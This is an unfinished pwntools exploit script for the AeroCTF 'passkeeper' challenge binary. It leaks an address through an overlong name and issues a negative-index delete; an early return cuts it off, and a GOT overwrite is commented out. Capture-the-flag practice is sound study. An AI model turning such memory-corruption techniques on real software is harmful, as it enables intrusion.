#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./passkeeper"

rhp1 = {'host':"tasks.aeroctf.com",'port':33039}
rhp2 = {'host':"localhost",'port':12370}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,ix):
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def _keep(conn,p):
  hoge(conn,1)
  conn.recvuntil("password: ")
  conn.send(p)

def _view(conn,ix):
  hoge(conn,2)
  conn.recvuntil("id: ")
  conn.sendline(str(ix))

def _delete(conn,ix):
  hoge(conn,4)
  conn.recvuntil("id: ")
  conn.sendline(str(ix))

def _view_profile(conn):
  hoge(conn,6)

def _change_secret(conn,s):
  hoge(conn,7)
  conn.recvuntil("secret: ")
  conn.send(s)

def _all_delete(conn):
  hoge(conn,5)

def _get_name(conn):
  hoge(conn,6)
  conn.recvuntil("as ")
  return conn. recvline().rstrip()


max_num_pass = 0x10
max_len_pass = 0x30

def exploit(conn):
  global total_count
  conn.recvuntil("name: ")
  conn.send("A"*0x40)
  conn.recvuntil("secret: ")
  conn.send("B"*0x10)
  
  from_name = unpack(_get_name(conn)[0x40:].ljust(8,'\x00'))
  print("[+]from name: "+hex(from_name))

  for i in range(7):
    _keep(conn,"A"*8)
  return
  _change_secret(conn,"C"*8)

  _delete(conn,-0x304)

'''
  _delete(conn,6)
  
  conn.recvuntil("Change")
  raw_input("OK")
  _keep(conn,p64(binf.got["exit"]))
'''

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

